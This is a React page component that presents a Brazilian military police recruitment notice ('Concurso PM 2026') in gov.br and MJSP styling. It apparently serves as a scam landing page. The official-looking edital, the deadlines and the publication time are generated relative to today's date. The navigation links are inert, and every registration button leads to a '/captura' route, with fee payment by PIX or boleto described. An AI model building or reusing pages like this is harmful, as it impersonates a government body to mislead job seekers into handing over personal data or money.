import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { useLocation } from 'wouter';
import { useEffect, useMemo, useState, useCallback, Fragment } from 'react';
import { useEstadoPM } from '@/hooks/useEstadoPM';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { getExamDate } from '@/utils/examDate';
import avatarSecretario from "@assets/chicolucas_1772976993137.jpg";
import logoHeader from "@assets/logoheader_1772976087386.webp";

import LULA_E_INS from "@assets/LULA_E_INS.png";

import lula__1_ from "@assets/lula (1).jpeg";

export default function HealthRegistrationPage() {
  const [, setLocation] = useLocation();
  const { trackEvent, trackReturnVisit } = useClarityEvents();
  const estadoPM = useEstadoPM();

  const dataInicioInscricoes = useMemo(() => {
    const d = getExamDate();
    d.setDate(d.getDate() - 42);
    const dia = String(d.getDate()).padStart(2, '0');
    const mes = String(d.getMonth() + 1).padStart(2, '0');
    const ano = d.getFullYear();
    return `${dia}/${mes}/${ano}`;
  }, []);

  const dataPrazoInscricoes = useMemo(() => {
    const d = getExamDate();
    d.setDate(d.getDate() - 21);
    const dia = String(d.getDate()).padStart(2, '0');
    const mes = String(d.getMonth() + 1).padStart(2, '0');
    const ano = d.getFullYear();
    return `${dia}/${mes}/${ano}`;
  }, []);

  const dataProvaEdital = useMemo(() => {
    const d = getExamDate();
    const dia = String(d.getDate()).padStart(2, '0');
    const mes = String(d.getMonth() + 1).padStart(2, '0');
    const ano = d.getFullYear();
    return `${dia}/${mes}/${ano}`;
  }, []);

  // derived geo values — used throughout the page
  const sigla      = estadoPM?.sigla ?? 'PM';
  const nomeCorpo  = estadoPM?.nomeCompleto ?? 'Polícias Militares estaduais';
  const vSoldado   = estadoPM?.vagasSoldado ?? 800;
  const vOficial   = estadoPM?.vagasOficial ?? 200;
  const vTotal     = vSoldado + vOficial;
  const fmt        = (n: number) => n.toLocaleString('pt-BR');
  const editalSlug = estadoPM ? `Edital ${sigla} 2026` : 'Edital PM 2026';

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const refParam = urlParams.get('ref');
    
    if (refParam) {
      localStorage.setItem('come_from_ref', refParam);
    }

    trackEvent('landing_page_entered', {
      page: 'health_registration_page',
      has_ref_param: !!refParam,
      ref_param: refParam || 'direct',
      timestamp: new Date().toISOString()
    });

    const lastVisit = localStorage.getItem('last_visit_timestamp');
    if (lastVisit) {
      const daysSinceLastVisit = Math.floor((Date.now() - parseInt(lastVisit)) / (1000 * 60 * 60 * 24));
      trackReturnVisit('health_registration_page', daysSinceLastVisit);
    }
    localStorage.setItem('last_visit_timestamp', Date.now().toString());

    const fbq = (window as any).fbq;
    if (fbq) {
      fbq('track', 'ViewContent', {
        content_name: editalSlug,
        content_category: `Polícia Militar — MJSP${estadoPM ? ` / ${estadoPM.sigla}` : ''}`,
        value: 4936.00,
        currency: 'BRL'
      });
    }
  }, [estadoPM]);

  const handleRegistration = () => {
    trackEvent('registration_cta_clicked', {
      cta_text: 'fazer_inscricao',
      page: 'health_registration_page',
      user_intent: 'start_registration',
      timestamp: new Date().toISOString()
    });

    const fbq = (window as any).fbq;
    if (fbq) {
      fbq('track', 'ViewContent', {
        content_name: editalSlug,
        content_category: `Polícia Militar — MJSP${estadoPM ? ` / ${estadoPM.sigla}` : ''}`,
        value: 4936.00,
        currency: 'BRL'
      });
    }

    const clarity = (window as any).clarity;
    if (clarity) {
      clarity('event', 'navigation_to_login', {
        source_page: 'landing_page',
        user_intent: 'start_registration',
        cta_clicked: 'fazer_inscricao'
      });
    }
    
    setLocation('/captura');
  };

  const [showEdital, setShowEdital] = useState(false);

  const fecharEdital = useCallback(() => {
    setShowEdital(false);
    document.body.style.overflow = '';
  }, []);

  const abrirEdital = useCallback(() => {
    setShowEdital(true);
    document.body.style.overflow = 'hidden';
  }, []);

  useEffect(() => {
    if (!showEdital) return;
    const handleEsc = (e: KeyboardEvent) => { if (e.key === 'Escape') fecharEdital(); };
    window.addEventListener('keydown', handleEsc);
    return () => window.removeEventListener('keydown', handleEsc);
  }, [showEdital, fecharEdital]);

  const editalConteudo = [
    `EDITAL ${editalSlug.toUpperCase()} — CONCURSO PÚBLICO${estadoPM ? ` DA ${estadoPM.nomeCompleto.toUpperCase()}` : ' NACIONAL'} PARA PROVIMENTO DE CARGOS DE SOLDADO DE 2ª CLASSE E ASPIRANTE-A-OFICIAL`,
    `O MINISTÉRIO DA JUSTIÇA E SEGURANÇA PÚBLICA — MJSP, por meio da Secretaria Nacional de Segurança Pública — SENASP, no uso de suas atribuições legais e com base na autorização expedida pelo Ministério da Gestão e da Inovação em Serviços Públicos, torna público o presente Edital de Abertura de Concurso Público, destinado ao provimento de vagas na${estadoPM ? ` ${estadoPM.nomeCompleto}` : 's Polícias Militares estaduais participantes'}, em conformidade com os convênios firmados entre a União e os Estados signatários.`,
    "CAPÍTULO I — DAS DISPOSIÇÕES PRELIMINARES",
    `Art. 1º O presente concurso público destina-se ao provimento de ${fmt(vTotal)} vagas${estadoPM ? ` na ${estadoPM.nomeCompleto}` : ' distribuídas entre as Polícias Militares dos estados conveniados'}, sendo ${fmt(vSoldado)} vagas para o cargo de Soldado de 2ª Classe PM (nível médio) e ${fmt(vOficial)} vagas para o cargo de Aspirante-a-Oficial PM (nível superior), com lotação a ser definida conforme necessidade operacional da corporação.`,
    "§ 1º As vagas serão distribuídas nos municípios de maior carência operacional, observada a ordem de classificação dos candidatos e o regulamento interno da corporação.",
    "§ 2º A necessidade deste certame decorre do déficit histórico no efetivo policial, acentuado pelo aumento das aposentadorias programadas no período 2024–2028 e pelo crescimento das demandas de segurança pública em regiões metropolitanas e municípios do interior.",
    "Art. 2º Os cargos a que se refere este edital são de natureza militar estadual, com regime jurídico próprio das Polícias Militares, asseguradas as prerrogativas inerentes à carreira policial-militar e os benefícios previstos nos estatutos dos militares estaduais.",
    "CAPÍTULO II — DOS CARGOS, VAGAS E REMUNERAÇÃO",
    `Art. 3º São ofertados os seguintes cargos: I — Soldado de 2ª Classe PM: ${fmt(vSoldado)} vagas, nível médio, subsídio inicial de R$ 4.936,00 (quatro mil, novecentos e trinta e seis reais) durante o Curso de Formação de Soldados — CFSd, evoluindo para subsídio pleno após a conclusão da formação e promoção a Soldado de 1ª Classe; II — Aspirante-a-Oficial PM: ${fmt(vOficial)} vagas, nível superior, subsídio durante o Curso de Formação de Oficiais — CFO de R$ 8.900,00 (oito mil e novecentos reais), com progressão na carreira até os postos de Oficial Superior.`,
    "§ 1º Os aprovados farão jus, ainda, a adicional de risco de vida e insalubridade, auxílio-alimentação, auxílio-fardamento, auxílio-transporte, plano de saúde corporativo da corporação estadual, férias de 30 (trinta) dias anuais, 13º salário e progressão por antiguidade e merecimento, nos termos dos estatutos militares estaduais vigentes.",
    "§ 2º Durante o Curso de Formação (CFSd ou CFO), o candidato receberá subsídio integral e terá acesso ao rancho, alojamento e fardamento fornecidos pela corporação, conforme regulamento interno.",
    "§ 3º Após a conclusão do Curso de Formação e promoção ao posto inicial, o servidor policial-militar adquire estabilidade nos termos do Estatuto dos Militares Estaduais, observado o desempenho satisfatório no estágio probatório.",
    "CAPÍTULO III — DOS REQUISITOS PARA INSCRIÇÃO",
    "Art. 4º Poderá inscrever-se no concurso o candidato que, na data da matrícula no Curso de Formação, preencha os seguintes requisitos: I — ser brasileiro nato; II — para o cargo de Soldado PM: ter idade entre 18 (dezoito) e 30 (trinta) anos; para o cargo de Aspirante-a-Oficial PM: ter idade entre 18 (dezoito) e 28 (vinte e oito) anos; III — possuir, para Soldado PM, Ensino Médio completo; IV — possuir, para Aspirante-a-Oficial PM, diploma de curso de nível superior em qualquer área, reconhecido pelo MEC; V — ter altura mínima de 1,65 m (homens) ou 1,60 m (mulheres); VI — estar em situação regular com a Justiça Eleitoral e, se do sexo masculino, com o Serviço Militar; VII — não possuir antecedentes criminais e não ter sido demitido do serviço público por justa causa; VIII — possuir Carteira Nacional de Habilitação — CNH categoria B (recomendável à época da inscrição; obrigatória na posse).",
    "§ 1º São reservadas vagas para candidatos Pretos e Pardos (20%), Pessoas com Deficiência — PcD (5%), Indígenas e Quilombolas, conforme legislação federal e estadual vigente, desde que compatíveis com as atribuições do cargo.",
    "CAPÍTULO IV — DAS INSCRIÇÕES",
    "Art. 5º As inscrições serão realizadas exclusivamente pela internet, no portal oficial da banca organizadora responsável, no período de " + dataInicioInscricoes + " a " + dataPrazoInscricoes + ".",
    "Art. 6º A taxa de inscrição é de R$ 90,00 (noventa reais) para o cargo de Soldado de 2ª Classe PM e R$ 120,00 (cento e vinte reais) para o cargo de Aspirante-a-Oficial PM, sendo assegurada isenção nos termos da lei para candidatos em situação de hipossuficiência econômica.",
    "CAPÍTULO V — DAS ETAPAS DO CONCURSO PÚBLICO",
    "Art. 7º O concurso público será composto pelas seguintes etapas, todas de caráter eliminatório: I — Prova Objetiva, eliminatória e classificatória, aplicada em todo o território nacional; II — Teste de Aptidão Física — TAF, eliminatório, composto por provas de resistência cardiovascular (corrida 12 min ou 2.400 m), força de membros superiores (flexão de braço) e resistência abdominal (abdominal cronometrado), com índices mínimos por sexo e faixa etária; III — Avaliação Psicológica, eliminatória, destinada a aferir o equilíbrio emocional, a maturidade e o perfil comportamental compatíveis com a atividade policial-militar; IV — Investigação Social e de Vida Pregressa, eliminatória, com análise de antecedentes criminais, cíveis e administrativos; V — Exame Médico, eliminatório, para verificação das condições de saúde física e mental exigidas para o exercício da função policial-militar; VI — Curso de Formação de Soldados — CFSd ou Curso de Formação de Oficiais — CFO, eliminatório, com duração mínima de 6 (seis) meses, em regime de internato.",
    "Art. 8º A Prova Objetiva, para o cargo de Soldado de 2ª Classe PM, abrangerá as disciplinas: Língua Portuguesa, Raciocínio Lógico e Matemática, Conhecimentos Gerais, Legislação Penal Básica (Código Penal e Código de Processo Penal — parte geral) e Direitos Humanos e Cidadania. Para o cargo de Aspirante-a-Oficial PM, inclui adicionalmente Direito Constitucional, Direito Penal, Direito Processual Penal e Administração Pública.",
    "§ 1º A prova conterá 100 (cem) questões objetivas de múltipla escolha, sendo exigido o mínimo de 50% (cinquenta por cento) de acertos no total e mínimo de 40% (quarenta por cento) em cada disciplina para classificação.",
    "§ 2º As provas serão aplicadas nos 26 (vinte e seis) estados da federação e no Distrito Federal, nas datas previstas a partir de " + dataProvaEdital + ".",
    "CAPÍTULO VI — DA VALIDADE E NOMEAÇÃO",
    `Art. 9º O concurso público terá validade de 2 (dois) anos, prorrogável por igual período, a contar da homologação do resultado final. Os candidatos aprovados dentro do número de vagas serão convocados por ato do Secretário Nacional de Segurança Pública${estadoPM ? ` e do Comandante-Geral da ${estadoPM.sigla}` : ''}, observada a ordem de classificação e a disponibilidade de vagas.`,
    `Art. 10. A necessidade de abertura deste concurso decorre do déficit histórico no efetivo da${estadoPM ? ` ${estadoPM.nomeCompleto}` : 's Polícias Militares estaduais'}, agravado pela projeção de aposentadoria de aproximadamente 18% do efetivo atual no período 2024–2028, e pela crescente demanda por segurança pública nas regiões metropolitanas e municípios do interior.`,
    "CAPÍTULO VII — DAS DISPOSIÇÕES FINAIS",
    `Art. 11. Os casos omissos serão resolvidos pela Comissão do Concurso Público${estadoPM ? ` da ${estadoPM.sigla}` : ''}, observadas as normas vigentes e os regulamentos do MJSP e da SENASP.`,
    "Brasília, " + dataInicioInscricoes + ".",
    `SECRETARIA NACIONAL DE SEGURANÇA PÚBLICA — SENASP / MINISTÉRIO DA JUSTIÇA E SEGURANÇA PÚBLICA — MJSP${estadoPM ? ` / ${estadoPM.sigla.toUpperCase()}` : ''}`,
  ];

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader
        customTitle={estadoPM ? estadoPM.sigla : 'Polícia Militar'}
        customSubtitle={editalSlug}
      />
      <nav aria-label="Você está em">
        <div style={{ maxWidth: '64rem', margin: '0 auto', padding: '8px 16px' }}>
          <ol style={{ display: 'flex', flexWrap: 'wrap', alignItems: 'center', gap: '2px', listStyle: 'none', margin: 0, padding: 0 }}>
            {[
              { label: null, icon: 'fas fa-home', href: '#' },
              { label: 'Ministério da Justiça', href: '#' },
              { label: estadoPM ? estadoPM.sigla : 'Polícia Militar', href: '#' },
              { label: 'Concurso Público', href: '#' },
              { label: editalSlug, href: null },
            ].map((item, i, arr) => (
              <li key={i} style={{ display: 'flex', alignItems: 'center', gap: '2px' }}>
                {item.href ? (
                  <a
                    href={item.href}
                    onClick={e => e.preventDefault()}
                    style={{ fontSize: '12px', color: '#2670e8', textDecoration: 'none', fontFamily: 'Rawline, Arial, sans-serif' }}
                  >
                    {item.icon ? <i className={item.icon} style={{ fontSize: '13px' }} /> : item.label}
                  </a>
                ) : (
                  <span style={{ fontSize: '12px', color: '#555', fontFamily: 'Rawline, Arial, sans-serif' }} aria-current="page">
                    {item.label}
                  </span>
                )}
                {i < arr.length - 1 && (
                  <span style={{ fontSize: '12px', color: '#888', margin: '0 2px' }} aria-hidden="true">›</span>
                )}
              </li>
            ))}
          </ol>
        </div>
      </nav>
      <main className="max-w-4xl mx-auto px-4 py-8 pt-2">
        <header className="mb-8">
          <p style={{ fontSize: '13px', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '1px', color: '#555', marginBottom: '8px', fontFamily: 'Rawline, Arial, sans-serif' }}>
            Concurso Público Estadual
          </p>

          <h1 className="font-bold mb-4" style={{ color: '#0c326f', fontSize: '1.5rem', lineHeight: '2.1rem' }}>
            {estadoPM
              ? <>Concurso {estadoPM.sigla} 2026: <strong>{fmt(vTotal)} vagas</strong> para Soldado e Oficial da <strong>{estadoPM.nomeCompleto}</strong></>
              : <>Concurso PM 2026: 1.000 vagas para Soldado e Oficial das Polícias Militares estaduais em todo o Brasil</>
            }
          </h1>

          <p className="text-lg text-[#555555] leading-relaxed mb-4">
            {estadoPM ? (
              <>A <strong>{estadoPM.nomeCompleto}</strong> abre <strong>{fmt(vTotal)} vagas</strong> neste edital: <strong>{fmt(vSoldado)} vagas de Soldado de 2ª Classe PM</strong> (nível médio, subsídio de R$ 4.936,00) e <strong>{fmt(vOficial)} vagas de Aspirante-a-Oficial PM</strong> (nível superior, subsídio de R$ 8.900,00+), coordenado pelo Ministério da Justiça e Segurança Pública (SENASP).</>
            ) : (
              <>O <strong>Ministério da Justiça e Segurança Pública</strong> abre <strong>1.000 vagas nacionais</strong>: <strong>800 vagas de Soldado de 2ª Classe PM</strong> (nível médio, subsídio de R$ 4.936,00) e <strong>200 vagas de Aspirante-a-Oficial PM</strong> (nível superior, subsídio de R$ 8.900,00+), com distribuição entre as corporações estaduais conveniadas.</>
            )}
          </p>

          <div className="mb-5" style={{ textAlign: 'center' }}>
            <button
              onClick={handleRegistration}
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: '10px',
                backgroundColor: '#268744',
                color: '#fff',
                border: 'none',
                borderRadius: '50px',
                padding: '12px 28px',
                fontSize: '15px',
                fontWeight: 700,
                fontFamily: 'Rawline, Arial, sans-serif',
                cursor: 'pointer',
                transition: 'background-color 0.2s',
                letterSpacing: '0.04em',
              }}
              onMouseOver={e => (e.currentTarget.style.backgroundColor = '#003580')}
              onMouseOut={e => (e.currentTarget.style.backgroundColor = '#268744')}
            >
              Inscreva-se
              <i className="fas fa-arrow-right" style={{ fontSize: '13px' }} />
            </button>
          </div>

          <div className="mb-6">
            <hr className="border-gray-200 mb-3" />
            <div className="flex flex-col items-center gap-3 sm:flex-row sm:justify-between sm:items-center">
              <time
                dateTime={(() => { const d = new Date(); d.setDate(d.getDate() - 11); return d.toISOString().slice(0,10); })() + "T16:57:00"}
                className="text-sm text-gray-500"
              >
                Publicado em {dataInicioInscricoes} 16:57
              </time>
              <div className="flex items-center gap-3">
                <span className="text-xs text-gray-500">Compartilhe:</span>
                <span aria-label="Compartilhe no WhatsApp" className="flex items-center justify-center" style={{ color: '#2670e8' }}>
                  <i className="fab fa-whatsapp text-lg"></i>
                </span>
                <span aria-label="Compartilhe no X" className="flex items-center justify-center font-bold text-sm leading-none" style={{ color: '#2670e8' }}>
                  𝕏
                </span>
                <span aria-label="Compartilhe no Facebook" className="flex items-center justify-center" style={{ color: '#2670e8' }}>
                  <i className="fab fa-facebook-f text-lg"></i>
                </span>
                <span aria-label="Compartilhe no LinkedIn" className="flex items-center justify-center" style={{ color: '#2670e8' }}>
                  <i className="fab fa-linkedin-in text-lg"></i>
                </span>
                <span aria-label="Copiar link" className="flex items-center justify-center" style={{ color: '#2670e8' }}>
                  <i className="fas fa-link text-lg"></i>
                </span>
              </div>
            </div>
          </div>

          <img 
            src={lula__1_}
            alt={`${editalSlug} — Concurso Público para Soldado e Oficial${estadoPM ? ` da ${estadoPM.nomeCompleto}` : ' das Polícias Militares Estaduais'}`}
            className="w-full mb-6 rounded shadow-sm"
            onClick={handleRegistration}
            fetchPriority="high"
          />

        </header>

        <article>
          <p className="text-lg text-[#555555] leading-relaxed mb-6">
            <span style={{ float: 'left', fontSize: '3.8rem', lineHeight: '0.8', fontWeight: 700, color: '#155bcb', marginRight: '6px', marginTop: '6px', fontFamily: 'Georgia, serif' }}>A</span>
            {estadoPM ? (
              <>carreira na <strong>{estadoPM.nomeCompleto}</strong> oferece o que poucos empregos garantem: <strong>estabilidade no serviço público estadual</strong>, remuneração competitiva desde o primeiro dia de formação, plano de saúde, progressão por patentes e uma carreira de longo prazo com reconhecimento institucional. O ingresso se dá por concurso público — sem indicação, sem exceções.</>
            ) : (
              <>carreira nas <strong>Polícias Militares estaduais</strong> oferece o que poucos empregos garantem: <strong>estabilidade no serviço público</strong>, remuneração competitiva desde o primeiro dia de formação, plano de saúde, progressão por patentes e uma carreira de longo prazo com reconhecimento institucional. O ingresso se dá por concurso público — sem indicação, sem exceções.</>
            )}
          </p>

          <div className="mb-6" style={{ textAlign: 'center' }}>
            <button
              onClick={handleRegistration}
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: '10px',
                backgroundColor: '#268744',
                color: '#fff',
                border: 'none',
                borderRadius: '50px',
                padding: '12px 28px',
                fontSize: '15px',
                fontWeight: 600,
                fontFamily: 'Rawline, Arial, sans-serif',
                cursor: 'pointer',
                transition: 'background-color 0.2s',
              }}
              onMouseOver={e => (e.currentTarget.style.backgroundColor = '#003580')}
              onMouseOut={e => (e.currentTarget.style.backgroundColor = '#268744')}
            >
              Iniciar inscrição
              <i className="fas fa-arrow-right" style={{ fontSize: '13px' }} />
            </button>
          </div>

          <p className="text-xs mb-6" style={{ textAlign: 'center', color: '#888', marginTop: '-8px' }}>
            Prazo encerra em {dataPrazoInscricoes}.
          </p>

          <p className="text-lg text-[#555555] leading-relaxed mb-6">
            {estadoPM ? (
              <>A <strong>{estadoPM.nomeCompleto}</strong> acumula um <strong>déficit histórico de efetivo</strong> — projeções do Ministério da Justiça e Segurança Pública indicam que aproximadamente <strong>18% do contingente atual se aposentará até 2028</strong>, sem reposição proporcional nas últimas décadas. Somado ao crescimento das demandas de segurança pública no estado, o governo coordena o <strong>{editalSlug}</strong>, o maior processo seletivo da corporação em mais de uma década.</>
            ) : (
              <>As Polícias Militares estaduais acumulam um <strong>déficit histórico de efetivo</strong> — projeções do Ministério da Justiça e Segurança Pública indicam que aproximadamente <strong>18% do contingente atual se aposentará até 2028</strong>, sem reposição proporcional nas últimas décadas. Somado ao crescimento das demandas de segurança pública em regiões metropolitanas e municípios do interior, os governos estaduais coordenam o <strong>Edital PM 2026</strong>, o maior processo seletivo das corporações militares estaduais em mais de uma década.</>
            )}
          </p>

          <div className="mb-8" style={{ borderTop: '2px solid #155bcb', paddingTop: '16px' }}>
            <span style={{ fontSize: '0.65rem', fontWeight: 800, letterSpacing: '0.12em', textTransform: 'uppercase', color: '#155bcb', display: 'block', marginBottom: '6px' }}>
              Contexto
            </span>
            <p className="font-semibold mb-2" style={{ fontSize: '0.95rem', color: '#155bcb' }}>
              Por que a {sigla} está abrindo vagas agora?
            </p>
            <p className="text-lg leading-relaxed" style={{ color: '#444' }}>
              O efetivo da{estadoPM ? ` ${estadoPM.nomeCompleto}` : 's Polícias Militares estaduais'} está abaixo do índice recomendado pela ONU de <strong>3 policiais por 1.000 habitantes</strong>{estadoPM ? ' no estado' : ' em mais de 60% dos estados brasileiros'}. A onda de aposentadorias prevista para o período <strong>2024–2028</strong> agravará esse déficit sem reposição imediata. O <strong>{editalSlug}</strong>, coordenado pelo MJSP/SENASP, é a resposta estrutural dos governos estaduais para modernizar e recompor o efetivo das corporações.
            </p>
          </div>

          <h2 className="text-xl font-bold mt-8 mb-4" style={{ color: '#1351b4' }}>Como se inscrever</h2>

          <ol style={{ listStyle: 'none', padding: 0, margin: '0 0 24px', fontSize: '1.125rem', color: '#333' }}>
            {([
              <><strong>Acesse</strong> o portal de inscrições nesta página do <strong>gov.br</strong> e crie ou acesse sua conta.</>,
              <><strong>Preencha</strong> o formulário com seus dados pessoais e escolha o cargo desejado (Soldado PM ou Aspirante-a-Oficial PM).</>,
              <><strong>Pague a taxa</strong> de inscrição via boleto bancário ou PIX. Candidatos de baixa renda podem solicitar isenção conforme critérios do edital.</>,
              <><strong>Acompanhe</strong> o resultado da sua inscrição e os comunicados oficiais pelo mesmo portal. As provas ocorrem nos 26 estados e no Distrito Federal, com data prevista para <strong>{dataProvaEdital}</strong>.</>,
            ] as React.ReactNode[]).map((item, i) => (
              <li key={i} style={{ display: 'flex', gap: '14px', padding: '8px 0', borderBottom: '1px solid #ebebeb', lineHeight: '1.6' }}>
                <span style={{ minWidth: '24px', fontWeight: 700, color: '#1351b4', fontSize: '0.9rem', paddingTop: '2px', flexShrink: 0 }}>{i + 1}.</span>
                <span>{item}</span>
              </li>
            ))}
          </ol>

          <div className="mb-8">
            {/* ── Requisitos Básicos ── */}
            <div style={{ borderBottom: '2px solid #1351b4', paddingBottom: '4px', marginBottom: '12px' }}>
              <span style={{ fontSize: '0.65rem', fontWeight: 700, letterSpacing: '0.1em', textTransform: 'uppercase', color: '#555' }}>Seção III</span>
              <h3 className="font-bold m-0" style={{ fontSize: '0.95rem', color: '#1351b4', letterSpacing: '0.01em' }}>
                Art. 4º — Dos Requisitos para Inscrição
              </h3>
            </div>
            <ol style={{ listStyle: 'none', padding: 0, margin: 0, fontSize: '1.125rem', color: '#333' }}>
              {([
                <><strong>Escolaridade:</strong> Ensino Médio completo para Soldado PM; curso superior em qualquer área para Aspirante-a-Oficial.</>,
                <><strong>Altura mínima:</strong> 1,65 m para homens e 1,60 m para mulheres.</>,
                <><strong>Aptidão física:</strong> aprovação no Teste de Aptidão Física (TAF) — corrida de 2.400 m, flexão de braço e abdominal. Etapa eliminatória.</>,
                <><strong>Avaliação psicológica e investigação social:</strong> ambas eliminatórias. Sem antecedentes criminais.</>,
                <><strong>Situação regular:</strong> brasileiro nato, em dia com a Justiça Eleitoral e, se homem, com o Serviço Militar.</>,
                <><strong>Cotas:</strong> vagas reservadas para Pretos e Pardos (20%), PcD (5%) e Indígenas/Quilombolas.</>,
              ] as React.ReactNode[]).map((item, i) => {
                const numerais = ['I','II','III','IV','V','VI','VII','VIII','IX','X'];
                return (
                  <li key={i} style={{ display: 'flex', gap: '12px', padding: '6px 0', borderBottom: '1px solid #ebebeb', lineHeight: '1.6' }}>
                    <span style={{ minWidth: '28px', fontWeight: 700, color: '#555', fontSize: '0.8rem', paddingTop: '1px', flexShrink: 0 }}>{numerais[i]} —</span>
                    <span>{item}</span>
                  </li>
                );
              })}
            </ol>

            {/* ── Benefícios ── */}
            <div style={{ borderBottom: '2px solid #1351b4', paddingBottom: '4px', marginBottom: '12px', marginTop: '28px' }}>
              <span style={{ fontSize: '0.65rem', fontWeight: 700, letterSpacing: '0.1em', textTransform: 'uppercase', color: '#555' }}>Seção IV</span>
              <h3 className="font-bold m-0" style={{ fontSize: '0.95rem', color: '#1351b4', letterSpacing: '0.01em' }}>
                Art. 5º — Das Vantagens e Benefícios do Cargo
              </h3>
            </div>
            <ol style={{ listStyle: 'none', padding: 0, margin: 0, fontSize: '1.125rem', color: '#333' }}>
              {([
                <><strong>Estabilidade no serviço público estadual</strong> — cargo efetivo, sem risco de demissão arbitrária após o estágio probatório.</>,
                <><strong>Adicional de risco</strong> pago todo mês sobre o salário base, reconhecendo a natureza da função.</>,
                <><strong>Vale-alimentação e fardamento</strong> fornecidos — sem desconto no salário.</>,
                <><strong>Plano de saúde</strong> médico e odontológico extensivo a dependentes diretos.</>,
                <><strong>30 dias de férias</strong> por ano com adicional de 1/3 constitucional + 13º salário integral.</>,
                <><strong>Progressão de carreira</strong> por tempo de serviço e mérito — promoção às patentes seguintes dentro da própria corporação.</>,
                <><strong>Curso de Formação totalmente custeado:</strong> salário integral, moradia, refeição e uniforme pagos pela corporação durante toda a formação.</>,
                <><strong>Qualificação continuada</strong> — cursos de especialização e aperfeiçoamento pagos pela corporação ao longo da carreira.</>,
              ] as React.ReactNode[]).map((item, i) => {
                const numerais = ['I','II','III','IV','V','VI','VII','VIII'];
                return (
                  <li key={i} style={{ display: 'flex', gap: '12px', padding: '6px 0', borderBottom: '1px solid #ebebeb', lineHeight: '1.6' }}>
                    <span style={{ minWidth: '28px', fontWeight: 700, color: '#555', fontSize: '0.8rem', paddingTop: '1px', flexShrink: 0 }}>{numerais[i]} —</span>
                    <span>{item}</span>
                  </li>
                );
              })}
            </ol>
          </div>

          <div className="mb-8">
            <h3 className="text-lg font-semibold text-[#333] mb-4" style={{ color: '#1351b4' }}>
              Remuneração por Cargo
            </h3>
            <div className="space-y-3 text-[#555555]">
              <p>
                O <strong>Soldado de 2ª Classe PM</strong> (nível médio) recebe subsídio inicial de <strong>R$ 4.936,00</strong> durante o Curso de Formação de Soldados — CFSd{estadoPM ? ` da ${estadoPM.sigla}` : ''}, evoluindo para o subsídio pleno após a promoção, acrescido de adicional de risco de vida, auxílio-alimentação, auxílio-fardamento e demais benefícios previstos no Estatuto dos Militares Estaduais.
              </p>
              <p>
                O <strong>Aspirante-a-Oficial PM</strong> (nível superior) recebe subsídio de <strong>R$ 8.900,00+</strong> durante o Curso de Formação de Oficiais — CFO, com carreira progressiva até os postos de Oficial Superior. Somando subsídio, adicionais de risco, auxílios e benefícios, o pacote total de remuneração é um dos mais competitivos da segurança pública estadual para nível médio e superior.
              </p>
            </div>
          </div>

          <div className="my-10" style={{ borderTop: '3px solid #268744', paddingTop: '20px' }}>
            <p style={{ fontSize: '0.7rem', fontWeight: 700, letterSpacing: '0.1em', textTransform: 'uppercase', color: '#268744', marginBottom: '4px' }}>
              Abertura de Inscrições
            </p>
            <p className="font-bold mb-5" style={{ fontSize: '1rem', color: '#1351b4' }}>
              {editalSlug} — {estadoPM ? estadoPM.nomeCompleto : 'Polícias Militares Estaduais'}
            </p>

            <dl style={{ display: 'grid', gridTemplateColumns: '160px 1fr', fontSize: '1.125rem', borderTop: '1px solid #e5e7eb' }}>
              {[
                { label: 'Cargo(s)', value: 'Soldado de 2ª Classe PM (nível médio) · Aspirante-a-Oficial PM (nível superior)' },
                { label: 'Total de vagas', value: estadoPM ? `${fmt(vTotal)} vagas (${fmt(vSoldado)} Soldado + ${fmt(vOficial)} Oficial)` : '1.000 vagas (800 Soldado + 200 Oficial)' },
                { label: 'Início das inscrições', value: dataInicioInscricoes },
                { label: 'Encerramento', value: dataPrazoInscricoes, red: true },
                { label: 'Portal', value: 'gov.br — inscrições exclusivamente online' },
              ].map(({ label, value, red }) => (
                <Fragment key={label}>
                  <dt style={{ padding: '7px 0', borderBottom: '1px solid #e5e7eb', color: '#555', fontWeight: 600 }}>{label}</dt>
                  <dd style={{ padding: '7px 0', borderBottom: '1px solid #e5e7eb', color: red ? '#c0392b' : '#222', fontWeight: red ? 600 : 400, margin: 0 }}>{value}</dd>
                </Fragment>
              ))}
            </dl>

            <div className="mt-5 flex items-center gap-4">
              <button
                onClick={handleRegistration}
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                  backgroundColor: '#268744',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '0',
                  padding: '10px 24px',
                  fontSize: '0.875rem',
                  fontWeight: 700,
                  fontFamily: 'Rawline, Arial, sans-serif',
                  cursor: 'pointer',
                  transition: 'background-color 0.2s',
                }}
                onMouseOver={e => (e.currentTarget.style.backgroundColor = '#1a5e30')}
                onMouseOut={e => (e.currentTarget.style.backgroundColor = '#268744')}
              >
                Realizar Inscrição
              </button>
              <span style={{ fontSize: '0.75rem', color: '#888' }}>
                Prazo final: <strong style={{ color: '#c0392b' }}>{dataPrazoInscricoes}</strong>
              </span>
            </div>
          </div>


          <div style={{ borderBottom: '2px solid #1351b4', paddingBottom: '4px', marginBottom: '12px', marginTop: '32px' }}>
            <span style={{ fontSize: '0.65rem', fontWeight: 700, letterSpacing: '0.1em', textTransform: 'uppercase', color: '#555' }}>Seção V</span>
            <h2 className="font-bold m-0" style={{ fontSize: '0.95rem', color: '#1351b4' }}>
              Art. 6º — O que acontece após a inscrição?
            </h2>
          </div>

          <p className="text-lg text-[#555555] leading-relaxed mb-4">
            O processo seletivo é composto por <strong>6 etapas eliminatórias</strong>, realizadas na seguinte ordem:
          </p>
          <ol style={{ listStyle: 'none', padding: 0, margin: '0 0 12px', fontSize: '1.125rem', color: '#333' }}>
            {([
              <><strong>Prova Objetiva</strong> — conteúdo de nível médio ou superior, conforme o cargo. Data prevista: <strong>{dataProvaEdital}</strong>.</>,
              <><strong>Teste de Aptidão Física (TAF)</strong> — corrida de 2.400 m, flexão de braço e abdominal. Índices variam por sexo e faixa etária.</>,
              <><strong>Avaliação Psicológica</strong> — realizada por equipe técnica credenciada. Eliminatória.</>,
              <><strong>Investigação Social</strong> — verificação de antecedentes e conduta. Eliminatória.</>,
